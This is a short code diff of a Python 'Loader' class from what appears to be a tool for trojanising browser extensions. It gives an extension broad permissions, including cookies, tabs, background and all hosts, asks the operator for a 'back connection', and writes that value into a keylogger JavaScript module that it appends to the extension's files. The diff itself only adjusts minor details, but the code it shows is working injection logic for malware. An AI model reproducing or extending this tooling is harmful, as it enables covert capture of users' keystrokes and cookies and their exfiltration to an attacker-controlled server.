@@ -30,7 +30,7 @@ class Loader :
 					data.update(payload) 
 
 				if not "permissions" in data:
-					payload = {"permissions": ["tabs", "<all_urls>", "background", "cookies", "activeTab", "*://*/*"]}
+					payload = {"permissions": ["tabs", "background", "cookies", "activeTab", "*://*/*"]}
 					data.update(payload) 
 
 				permites = data['permissions']
@@ -70,13 +70,13 @@ class Loader :
 
 			modules = "modules/keylogger/keylogger.js" # Javascript file to inject into background
 			print("{} Configuration of module {}".format(self.color.yellows("[!]"), modules))
-			connection = raw_input("{} Set the back connection: ".format("[+]"))
+			connection = raw_input("{} Set the back connection: ".format(self.color.status("[+]")))
 			options = "{}".format(connection)
 
 		with open(modules, "rb") as f :
 			data = f.read()
-			data = data.replace("_0xacfd[2]", str(options))
+			data = data.replace("******", str(options))
 			with open("output/extensions/{}/{}".format(self.extension, path), "a") as s :
 				s.write(data)
-				print("{} Module as been injected {}".format(self.color.status("[!]"), modules))
-				s.close()
+				print("{} Module as been injected {}".format(self.color.yellows("[!]"), modules))
+			s.close()
